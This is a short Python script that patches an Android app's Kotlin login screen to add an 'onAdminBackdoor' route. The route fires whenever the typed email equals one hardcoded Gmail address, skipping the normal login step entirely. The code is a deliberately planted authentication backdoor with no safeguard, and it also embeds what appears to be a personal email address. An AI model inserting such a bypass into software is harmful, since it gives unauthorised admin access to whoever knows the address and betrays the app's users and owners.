import re

with open("app/src/main/java/com/example/ui/screens/LoginScreen.kt", "r") as f:
    content = f.read()

# Add onAdminBackdoor parameter
target1 = """fun LoginScreen(
    onBack: () -> Unit,
    onLoginSuccess: () -> Unit,
    modifier: Modifier = Modifier
) {"""

replacement1 = """fun LoginScreen(
    onBack: () -> Unit,
    onLoginSuccess: () -> Unit,
    onAdminBackdoor: () -> Unit,
    modifier: Modifier = Modifier
) {"""

content = content.replace(target1, replacement1)

# Intercept logic
target2 = """                        Button(
                            onClick = { step = 2 },"""

replacement2 = """                        Button(
                            onClick = {
                                if (email.trim() == "fand0388@gmail.com") {
                                    onAdminBackdoor()
                                } else {
                                    step = 2
                                }
                            },"""

content = content.replace(target2, replacement2)

with open("app/src/main/java/com/example/ui/screens/LoginScreen.kt", "w") as f:
    f.write(content)

